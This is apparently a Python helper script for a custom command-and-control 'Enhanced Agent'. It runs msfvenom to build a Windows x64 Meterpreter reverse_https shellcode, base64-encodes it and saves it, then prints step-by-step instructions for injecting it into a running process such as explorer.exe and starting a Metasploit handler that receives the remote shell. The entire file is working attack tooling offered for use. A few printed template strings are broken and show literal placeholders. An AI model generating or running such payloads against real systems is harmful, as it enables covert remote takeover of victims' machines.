#!/usr/bin/env python3
"""
MSF Payload Generator for Enhanced Agent
Generates base64-encoded shellcode for injection
"""
import subprocess
import base64
import sys

def generate_meterpreter(lhost, lport):
    """Generate Meterpreter shellcode"""
    print("[*] Generating Meterpreter payload...")
    print(f"[*] LHOST: {lhost}")
    print(f"[*] LPORT: {lport}")
    
    # Generate raw shellcode
    result = subprocess.run([
        'msfvenom',
        '-p', 'windows/x64/meterpreter/reverse_https',
        f'LHOST={lhost}',
        f'LPORT={lport}',
        '-f', 'raw'
    ], capture_output=True)
    
    if result.returncode != 0:
        print("[-] msfvenom failed:")
        print(result.stderr.decode())
        sys.exit(1)
    
    shellcode = result.stdout
    shellcode_b64 = base64.b64encode(shellcode).decode()
    
    print(f"[+] Shellcode generated: {len(shellcode)} bytes")
    print(f"[+] Base64 length: {len(shellcode_b64)} chars")
    print()
    print("="*60)
    print("INJECTION COMMAND")
    print("="*60)
    print()
    print("1. Find target process:")
    print("   In C2 web UI, send command: ps")
    print()
    print("2. Inject into process (e.g., explorer.exe):")
    print(f"   inject <PID> {{shellcode_b64}}")
    print()
    print("3. Start Metasploit handler:")
    print("   msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST {lhost}; set LPORT {lport}; exploit'")
    print()
    print("SHELLCODE (copy this):")
    print("-"*60)
    print(shellcode_b64)
    print("-"*60)
    
    # Save to file
    with open('shellcode.txt', 'w') as f:
        f.write(shellcode_b64)
    
    print()
    print("[+] Shellcode saved to: shellcode.txt")

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: python3 generate_payload.py <LHOST> <LPORT>")
        print("Example: python3 generate_payload.py 192.168.1.179 4444")
        sys.exit(1)
    
    lhost = sys.argv[1]
    lport = sys.argv[2]
    
    generate_meterpreter(lhost, lport)
